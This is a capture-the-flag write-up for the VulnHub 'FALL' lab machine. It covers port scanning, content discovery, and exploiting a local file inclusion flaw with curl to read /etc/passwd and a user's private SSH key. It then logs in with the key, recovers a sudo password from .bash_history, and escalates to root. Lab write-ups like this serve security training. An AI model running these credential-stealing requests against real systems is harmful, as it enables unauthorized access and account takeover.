# digitalworld.local: FALL

## Introduction

Welcome to my another writeup! In this VulnHub [digitalworld.local: FALL](https://www.vulnhub.com/entry/digitalworldlocal-fall,726/) box, you'll learn: Content discovery via `gobuster`, fuzzing GET parameter via `ffuf`, exploiting Local File Inclusion vulnerability, reading clear-text password in `.bash_history`, privilege escalation via misconfigurated Sudo permission, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: qiu to root](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

To celebrate the fifth year that the author has survived his infosec career, a new box has been born! This machine resembles a few different machines in the PEN-200 environment (making it yet another OSCP-like box). More enumeration practice indeed!

If you MUST have hints for this machine: FALL is (#1): what happens when one gets careless, (#2): important in making sure we can get up, (#3): the author's favourite season since it is a season of harvest.

## Service Enumeration

- Target machine IP address: `10.69.96.73`
- Attacker machine IP address: `10.69.96.100`

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|13:52:37(HKT)]
└> export RHOSTS=10.69.96.73
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|13:52:43(HKT)]
└> export LHOST=`ifconfig eth0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|13:53:09(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN scanning/rustscan.txt
[...]
Open 10.69.96.73:22
Open 10.69.96.73:80
Open 10.69.96.73:139
Open 10.69.96.73:443
Open 10.69.96.73:445
Open 10.69.96.73:3306
Open 10.69.96.73:9090
[...]
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.8 (protocol 2.0)
| ssh-hostkey: 
|   2048 c5:86:f9:64:27:a4:38:5b:8a:11:f9:44:4b:2a:ff:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBezJ/KDio6Fwya44wrK4/39Vd93TBRE3CC7En4GJYCcT89paKDGhozzWU7pAFV5FqWbBZ5Z9pJIGhVNvmIIYR1YoyTbkF3qbf41XBGCmI87nLqYxFXQys3iycBYah3qMxkr24N4SvU+OIOWItFQZSNCK3BzYlCnxFNVNh4JLqrI/Og40EP5Ck7REorRRIraefdROKDqZHPeugwV1UHbISjyDsKChbpobQxVl80RT1dszhuUU1BvhJl1sy/opLQWdRjsl97L1c0lc87AFcd6PgsGf6UFURN+1RaVngnZBFWWnYUb/HfCbKJGseTgATk+Fk5+IBOrlXJ4fQ9/SkagXL
|   256 e1:00:0b:cc:59:21:69:6c:1a:c1:77:22:39:5a:35:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAFLZltNl1U6p8d7Su4gH+FQmIRRpZlAuOHrQYHYdGeWADfzBXlPSDkCrItb9doE6+ACyru5Fm023LgiTNg8yGU=
|   256 1d:4e:14:6d:20:f4:56:da:65:83:6f:7d:33:9d:f0:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEeQTBvJOPKDtUv+nJyQJ9rKdAmrC577XXaTjRI+2n3c
80/tcp   open  http        syn-ack Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: EBF500D206705BDA0CB79021C15DA98A
|_http-title: Good Tech Inc's Fall Sales - Home
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: SAMBA)
443/tcp  open  ssl/http    syn-ack Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Good Tech Inc's Fall Sales - Home
| tls-alpn: 
|_  http/1.1
|_http-favicon: Unknown favicon MD5: EBF500D206705BDA0CB79021C15DA98A
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/organizationalUnitName=ca-2683772458131447713/emailAddress=root@localhost.localdomain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-08-15T03:51:33
| Not valid after:  2020-08-19T05:31:33
| MD5:   ac51:22da:893a:4d95:07ba:3e82:5780:bf24
| SHA-1: 8821:fdc6:7f1b:ac6a:2c7b:6a32:194d:ed44:b553:2cf4
| -----BEGIN CERTIFICATE-----
[...]
|_-----END CERTIFICATE-----
| http-robots.txt: 1 disallowed entry 
|_/
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
|_ssl-date: TLS randomness does not represent time
445/tcp  open  0|�tTV      syn-ack Samba smbd 4.8.10 (workgroup: SAMBA)
3306/tcp open  mysql       syn-ack MySQL (unauthorized)
9090/tcp open  http        syn-ack Cockpit web service 162 - 188
|_http-title: Did not follow redirect to https://10.69.96.73:9090/
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_clock-skew: 7h00m03s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 31059/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44527/tcp): CLEAN (Timeout)
|   Check 3 (port 64153/udp): CLEAN (Timeout)
|   Check 4 (port 61303/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.8.10)
|   NetBIOS computer name: FALL\x00
|   Workgroup: SAMBA\x00
|_  System time: 2023-08-16T22:53:58-07:00
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|13:53:15(HKT)]
└> sudo nmap -sU $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
Not shown: 997 filtered udp ports (host-prohibited)
PORT      STATE         SERVICE
69/udp    open|filtered tftp
161/udp   closed        snmp
54321/udp closed        bo2k
```

According to `rustscan` and `nmap` result, the target machine has 7 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22/TCP            | OpenSSH 7.8                   |
|80/TCP            | Apache httpd 2.4.39           |
|139/TCP           | NetBIOS                       |
|443/TCP           | Apache httpd 2.4.39           |
|445/TCP           | Samba smbd 4.8.10             |
|3306/TCP          | MySQL                         |
|9090/TCP          | Cockpit web service           |

### HTTP on TCP port 80

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/digitalworld.local:FALL/images/Pasted%20image%2020230817135621.png)

In here, we found that the web application is using a CMS (Content Management System) called "**CMS Made Simple**".

**In the footer of the index page, we can find its version:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/digitalworld.local:FALL/images/Pasted%20image%2020230817135720.png)

- CMS Made Simple version: 2.2.15

**Let's find some public exploits for this version via `searchsploit`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|13:57:07(HKT)]
└> searchsploit cms made simple 2.2.15
-------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                       | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                      | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)          | php/webapps/49199.txt
-------------------------------------------------------------------------------------------------- ---------------------------------
[...]
```

Hmm... A few results came out. Those XSS (Cross-Site Scripting) vulnerabilities maybe useless in this case, and the RCE (Remote Code Execution) **requires authentication**...

In the CMS, we can find some posts.

**"IMPORTANT!!! Job Application":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/digitalworld.local:FALL/images/Pasted%20image%2020230817135945.png)

Maybe we can send some malicious PDF files to user **Qiu**?

**"News - House Cleaning":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/digitalworld.local:FALL/images/Pasted%20image%2020230817140917.png)

**"News - Backdoor":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/digitalworld.local:FALL/images/Pasted%20image%2020230817140931.png)

So, it seems like **someone added a test script and it has a vulnerability?**

**To find that, we can perform content discovery via tools like `gobuster`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|14:07:16(HKT)]
└> gobuster dir -u http://$RHOSTS/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 40 -x php,phpx
[...]
/config.php           (Status: 200) [Size: 0]
[...]
/test.php             (Status: 200) [Size: 80]
[...]
/phpinfo.php          (Status: 200) [Size: 17]
[...]
```

Nice! We found the `/test.php` test script!

**`/test.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/digitalworld.local:FALL/images/Pasted%20image%2020230817141138.png)

Ah... "Missing GET parameter!".

**Let's fuzz the GET parameter via `ffuf`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|14:16:08(HKT)]
└> ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://$RHOSTS/test.php?FUZZ=test -fw 3 
[...]
[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
    * FUZZ: file
```

**Found GET parameter `file`!**

Based on the GET parameter name, **it should be including arbitrary files on the system?**

**Let's try to include the `/etc/passwd` file:** 
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|14:17:19(HKT)]
└> curl http://10.69.96.73/test.php --get --data-urlencode "file=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
[...]
qiu:x:1000:1000:qiu:/home/qiu:/bin/bash
[...]
```

Nice! And we found a system user!

- Found system user: `qiu`

## Initial Foothold

After Local File Inclusion (LFI) vulnerability has been found, we can try to gain initial foothold by:

1. RCE via LFI log poisoning
2. Reading configuration files

**First, we can try to read CMS Made Simple configuration file:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|14:20:41(HKT)]
└> curl http://10.69.96.73/test.php --get --data-urlencode "file=config.php"
```

Empty?

Then, I tried to read Apache access log and other logs, but no dice.

**After poking around, we can actually include system user `qiu`'s private SSH key!**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|14:32:49(HKT)]
└> curl http://10.69.96.73/test.php --get --data-urlencode "file=/home/qiu/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
[...]
```

**Let's download its SSH key and SSH into the machine via that key!**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|14:33:58(HKT)]
└> curl http://10.69.96.73/test.php --get --data-urlencode "file=/home/qiu/.ssh/id_rsa" > qiu_id_rsa
[...]
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|14:34:27(HKT)]
└> chmod 600 qiu_id_rsa
```

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/digitalworld.local:FALL)-[2023.08.17|14:34:33(HKT)]
└> ssh -i qiu_id_rsa qiu@$RHOSTS
[...]
[qiu@FALL ~]$ whoami; hostname; id; ip a
qiu
FALL
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu),10(wheel)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:c8:91:5a brd ff:ff:ff:ff:ff:ff
    inet 10.69.96.73/24 brd 10.69.96.255 scope global dynamic noprefixroute ens33
       valid_lft 1132sec preferred_lft 1132sec
    inet6 fe80::af86:ce1d:cf2a:e830/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

I'm user `qiu`!

**local.txt:**
```shell
[qiu@FALL ~]$ cat local.txt 
A low privilege shell! :-)
```

## Privilege Escalation

### qiu to root

After gaining initial foothold on a target machine, we need to escalate our privilege. To do so, we need to enumerate the system.

**Bash History in `qiu`'s home directory:**
```shell
[qiu@FALL ~]$ ls -lah
[...]
-rw-------  1 qiu  qiu  292 Sep  5  2021 .bash_history
[...]
```

Oh! The `.bash_history` file has no symbolic link to `/dev/null`! Which means **we can read `qiu`'s Bash history!**

```shell
[qiu@FALL ~]$ cat .bash_history 
[...]
echo "{Redacted}" | sudo -S dnf update
[...]
```

In those commands history, this command stands out. This is because the clear-text password is being piped to the `sudo` command! Which means we found `qiu`'s password!

**Now, we can view `qiu`'s Sudo permission:**
```shell
[qiu@FALL ~]$ sudo -l
[sudo] password for qiu: 
Matching Defaults entries for qiu on FALL:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL
    PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qiu may run the following commands on FALL:
    (ALL) ALL
```

Nice! User `qiu` can run any commands as `root`!!

**Hence, we can easily escalate our privilege to `root` via switching user from `qiu` to `root`:**
```shell
[qiu@FALL ~]$ sudo su
[root@FALL qiu]# whoami; hostname; id; ip a
root
FALL
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:c8:91:5a brd ff:ff:ff:ff:ff:ff
    inet 10.69.96.73/24 brd 10.69.96.255 scope global dynamic noprefixroute ens33
       valid_lft 971sec preferred_lft 971sec
    inet6 fe80::af86:ce1d:cf2a:e830/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

I'm `root`! :D

```shell
[root@FALL qiu]# cat /root/remarks.txt 
Hi!

Congratulations on rooting yet another box in the digitalworld.local series!

You may have first discovered the digitalworld.local series from looking for deliberately vulnerably machines to practise for the PEN-200 (thank you TJ_Null for featuring my boxes on the training list!)

I hope to have played my little part at enriching your PEN-200 journey.

Want to find the author? Find the author on Linkedin by rooting other boxes in this series!
```

## Rooted

**proof.txt:**
```shell
[root@FALL ~]# cat proof.txt 
Congrats on a root shell! :-)
```

## Conclusion

What we've learned:

1. Content discovery via `gobuster`
2. Fuzzing GET parameter via `ffuf`
3. Exploiting Local File Inclusion vulnerability
4. Reading clear-text password in `.bash_history`
5. Vertical privilege escalation via misconfigurated Sudo permission